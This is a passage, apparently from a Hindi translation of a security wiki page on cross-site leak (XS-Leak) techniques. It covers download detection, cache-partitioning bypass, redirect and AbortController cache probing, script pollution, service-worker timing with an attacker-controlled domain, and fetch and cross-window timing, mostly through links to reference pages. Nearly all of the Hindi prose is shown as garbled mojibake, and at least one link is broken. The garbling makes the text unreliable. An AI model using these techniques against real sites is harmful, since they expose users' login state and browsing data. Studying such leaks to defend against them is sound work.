рдЙрдард╛рдХрд░ рдЦрд╛рд▓реА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдпрджрд┐ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдЕрд╕рдВрдЧрдд рд░реВрдк рд╕реЗ X-Frame-Options рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рдЕрдХреНрд╕рд░ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрдареЛрдВ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддреЗ рд╣реИрдВред рд╕реБрд░рдХреНрд╖рд╛ рд╣реЗрдбрд░ рдХреЗ рдкреНрд░рддрд┐ рдЬрд╛рдЧрд░реВрдХрддрд╛ рдФрд░ рд╕реБрд╕рдВрдЧрдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВ рддрд╛рдХрд┐ рдРрд╕реЗ рд▓реАрдХ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗред

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** рдПрдХ рд╣рдорд▓рд╛рд╡рд░ iframe рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ; iframe рдХреА рдирд┐рд░рдВрддрд░ рдкрд╣реБрдВрдЪ рд╕рдлрд▓ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИред
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` рд╣реЗрдбрд░, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `Content-Disposition: attachment`, рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рди рдХрд┐ рдЗрд╕реЗ рдЗрдирд▓рд╛рдЗрди рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдПрдХ рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рдЬреЛ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред рдХреНрд░реЛрдорд┐рдпрдо-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ, рдЗрд╕ рдбрд╛рдЙрдирд▓реЛрдб рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:

1. **рдбрд╛рдЙрдирд▓реЛрдб рдмрд╛рд░ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ**:
* рдЬрдм рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреНрд░реЛрдорд┐рдпрдо-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╡рд┐рдВрдбреЛ рдХреЗ рдиреАрдЪреЗ рдПрдХ рдбрд╛рдЙрдирд▓реЛрдб рдмрд╛рд░ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред
* рд╡рд┐рдВрдбреЛ рдХреА рдКрдБрдЪрд╛рдИ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ рдбрд╛рдЙрдирд▓реЛрдб рдмрд╛рд░ рдХреЗ рдкреНрд░рдХрдЯ рд╣реЛрдиреЗ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рд╕реБрдЭрд╛рд╡ рджреЗрддреЗ рд╣реБрдП рдХрд┐ рдПрдХ рдбрд╛рдЙрдирд▓реЛрдб рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
2. **iframe рдХреЗ рд╕рд╛рде рдбрд╛рдЙрдирд▓реЛрдб рдиреЗрд╡рд┐рдЧреЗрд╢рди**:
* рдЬрдм рдПрдХ рдкреГрд╖реНрда `Content-Disposition: attachment` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдЗрд╡реЗрдВрдЯ рдХрд╛ рдХрд╛рд░рдг рдирд╣реАрдВ рдмрдирддрд╛ рд╣реИред
* рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ iframe рдореЗрдВ рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдЗрд╡реЗрдВрдЯреНрд╕ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдХреЗ, рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдирд┐рдкрдЯрд╛рди рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИ (рдХреЛрдИ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдирд╣реАрдВ) рдпрд╛ рдирд╣реАрдВред
3. **iframe рдХреЗ рдмрд┐рдирд╛ рдбрд╛рдЙрдирд▓реЛрдб рдиреЗрд╡рд┐рдЧреЗрд╢рди**:
* iframe рддрдХрдиреАрдХ рдХреЗ рд╕рдорд╛рди, рдпрд╣ рд╡рд┐рдзрд┐ `window.open` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИред
* рдирдП рдЦреЛрд▓реЗ рдЧрдП рд╡рд┐рдВрдбреЛ рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдЗрд╡реЗрдВрдЯреНрд╕ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдХреЗ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ (рдХреЛрдИ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдирд╣реАрдВ) рдпрд╛ рдпрджрд┐ рд╕рд╛рдордЧреНрд░реА рдЗрдирд▓рд╛рдЗрди рдкреНрд░рджрд░реНрд╢рд┐рдд рдХреА рдЧрдИ рд╣реИ (рдиреЗрд╡рд┐рдЧреЗрд╢рди рд╣реЛрддрд╛ рд╣реИ)ред

рдЙрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдХреЗрд╡рд▓ рд▓реЙрдЧрд┐рди рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдРрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** рдПрдХ рд╣рдорд▓рд╛рд╡рд░ iframe рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ; iframe рдХреА рдирд┐рд░рдВрддрд░ рдкрд╣реБрдВрдЪ рд╕рдлрд▓ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИред
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (рд╕реЗ [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
рдпрд╣ рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рджрд┐рд▓рдЪрд╕реНрдк рдмрдирд╛рддрд╛ рд╣реИ: рдХреНрд░реЛрдо рдЕрдм **рдХреИрд╢ рд╡рд┐рднрд╛рдЬрди** рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдирдП рдЦреЛрд▓реЗ рдЧрдП рдкреГрд╖реНрда рдХрд╛ рдХреИрд╢ рдХреБрдВрдЬреА рд╣реИ: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, рд▓реЗрдХрд┐рди рдпрджрд┐ рдореИрдВ рдПрдХ ngrok рдкреГрд╖реНрда рдЦреЛрд▓рддрд╛ рд╣реВрдБ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реВрдБ, рддреЛ рдХреИрд╢ рдХреБрдВрдЬреА рд╣реЛрдЧреА: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **рдХреИрд╢ рдХреБрдВрдЬреА рдЕрд▓рдЧ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХреИрд╢ рд╕рд╛рдЭрд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред рдЖрдк рдпрд╣рд╛рдБ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [рдХреИрд╢ рдХреЛ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЧреЛрдкрдиреАрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛](https://developer.chrome.com/blog/http-cache-partitioning/)\
([**рдпрд╣рд╛рдБ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) рд╕реЗ рдЯрд┐рдкреНрдкрдгреА)
{% endhint %}

рдпрджрд┐ рдПрдХ рд╕рд╛рдЗрдЯ `example.com` `*.example.com/resource` рд╕реЗ рдПрдХ рд╕рдВрд╕рд╛рдзрди рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ, рддреЛ рд╡рд╣ рд╕рдВрд╕рд╛рдзрди **рдЙрд╕реА рдХреИрд╢рд┐рдВрдЧ рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде рд╣реЛрдЧрд╛ рдЬреИрд╕реЗ рдХрд┐ рдпрджрд┐ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд╕реАрдзреЗ **рд╢реАрд░реНрд╖ рд╕реНрддрд░ рдХреА рдиреЗрд╡рд┐рдЧреЗрд╢рди** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдХреИрд╢рд┐рдВрдЧ рдХреБрдВрдЬреА рд╢реАрд░реНрд╖ рд╕реНрддрд░ рдХреЗ _eTLD+1_ рдФрд░ рдлреНрд░реЗрдо _eTLD+1_ рд╕реЗ рдмрдиреА рд╣реЛрддреА рд╣реИред

рдХреНрдпреЛрдВрдХрд┐ рдХреИрд╢ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рддреЗрдЬрд╝ рд╣реИ, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рдкреГрд╖реНрда рдХреЗ рд╕реНрдерд╛рди рдХреЛ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ 20ms (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рдХреЗ рдмрд╛рдж рд░рджреНрдж рдХрд░реЗрдВред рдпрджрд┐ рд░реЛрдХрдиреЗ рдХреЗ рдмрд╛рдж рдореВрд▓ рдмрджрд▓ рдЧрдпрд╛, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рдВрд╕рд╛рдзрди рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред\
рдпрд╛ рдмрд╕ **рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдХреИрд╢ рдХрд┐рдП рдЧрдП рдкреГрд╖реНрда рдкрд░ рдХреБрдЫ рдлрд╝реЗрдЪ рднреЗрдЬреЗрдВ рдФрд░ рдпрд╣ рдорд╛рдкреЗрдВ рдХрд┐ рдЗрд╕рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ**ред

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ fetch рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрддреНрддрд░ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реИ
* **Code Example**:

![](<../.gitbook/assets/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рд▓реЛрдб рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЗрд╕реЗ рд░реЛрдХ рджреЗрдВред рдпрджрд┐ рдПрдХ рддреНрд░реБрдЯрд┐ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ, рддреЛ рд╕рдВрд╕рд╛рдзрди рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдпрд╛ рдирд╣реАрдВред
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

_**fetch**_ рдФрд░ _**setTimeout**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдПрдХ **AbortController** рдХреЗ рд╕рд╛рде рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ **рд╕рдВрд╕рд╛рдзрди рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдФрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреИрд╢ рд╕реЗ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирдП рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рдХрд┐рдП рдмрд┐рдирд╛ рд╣реЛрддреА рд╣реИред

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдирд┐рд░реНрдорд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ** рдФрд░ рдЙрдирдХреЗ рддрд░реНрдХреЛрдВ рдХреЛ рдкрдврд╝реЗрдВ рдЬреЛ рдХрд┐ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рд╕реЗ рднреА рд╣реИрдВ (рдЬрд┐рд╕реЗ рд╕реАрдзреЗ рдирд╣реАрдВ рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛), рдпрд╣ **рдореВрд▓реНрдпрд╡рд╛рди рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** рд╕реЗрд╡рд╛ рд╢реНрд░рдорд┐рдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡реЗрдм рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдорд╛рдкреЗрдВред
* **Code Example**:

рджреА рдЧрдИ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдПрдХ рдбреЛрдореЗрди рдореЗрдВ рдПрдХ **рд╕реЗрд╡рд╛ рд╢реНрд░рдорд┐рдХ** рдХреЛ рдкрдВрдЬреАрдХреГрдд рдХрд░рдиреЗ рдХреА рдкрд╣рд▓ рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ "attacker.com"ред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдореБрдЦреНрдп рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ рд▓рдХреНрд╖рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ рдПрдХ рдирдИ рд╡рд┐рдВрдбреЛ рдЦреЛрд▓рддрд╛ рд╣реИ рдФрд░ **рд╕реЗрд╡рд╛ рд╢реНрд░рдорд┐рдХ** рдХреЛ рдПрдХ рдЯрд╛рдЗрдорд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬреИрд╕реЗ рд╣реА рдирдИ рд╡рд┐рдВрдбреЛ рд▓реЛрдб рд╣реЛрдирд╛ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ, рд╣рдорд▓рд╛рд╡рд░ рдкрд┐рдЫрд▓реЗ рдЪрд░рдг рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рд╕рдВрджрд░реНрдн рдХреЛ **рд╕реЗрд╡рд╛ рд╢реНрд░рдорд┐рдХ** рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдкреГрд╖реНрда рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рддрд╛ рд╣реИред

рдкрд┐рдЫрд▓реЗ рдЪрд░рдг рдореЗрдВ рд╢реБрд░реВ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рдХреЗ рдЖрдЧрдорди рдкрд░, **рд╕реЗрд╡рд╛ рд╢реНрд░рдорд┐рдХ** **204 (No Content)** рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, **рд╕реЗрд╡рд╛ рд╢реНрд░рдорд┐рдХ** рдкрд╣рд▓реЗ рдЪрд░рдг рдореЗрдВ рд╢реБрд░реВ рдХрд┐рдП рдЧрдП рдЯрд╛рдЗрдорд░ рд╕реЗ рдПрдХ рдорд╛рдк рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдорд╛рдк рдЙрд╕ рдЕрд╡рдзрд┐ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рджреЗрд░реА рдХрд╛ рдХрд╛рд░рдг рдмрдирддреА рд╣реИред

{% hint style="warning" %}
рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдореЗрдВ, рдпрд╣ **рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛рд░рдХреЛрдВ** рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ **рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдорд╛рдк** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рдХрд░рдирд╛ред
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (рдЖрдорддреМрд░ рдкрд░ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рдХрд╛рд░рдг)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдореЗрдВ рд▓рдЧрдиреЗ рд╡рд╛рд▓реЗ рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (рдЖрдорддреМрд░ рдкрд░ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рдХрд╛рд░рдг)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** `window.open` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдореЗрдВ рд▓рдЧрдиреЗ рд╡рд╛рд▓реЗ рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
